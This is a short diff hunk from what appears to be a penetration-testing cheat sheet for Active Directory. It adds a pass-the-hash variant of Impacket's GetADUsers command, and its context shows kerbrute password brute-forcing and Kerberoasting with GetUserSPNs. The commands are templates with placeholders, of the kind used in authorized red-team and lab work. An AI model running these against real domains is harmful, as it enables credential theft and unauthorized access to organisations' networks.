@@ -705,6 +705,7 @@ sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {IP ADDRESS} /usr/share/w
 
 # Get active directory users
 python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS}
+python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -hashes {HASH}:{HASH} {DOMAIN}/{USERNAME} -dc-ip {IP ADDRESS}
 
 # Kerberoast - Get user SPN
 python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request {DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {IP ADDRESS} -outputfile hashes.kerberoast
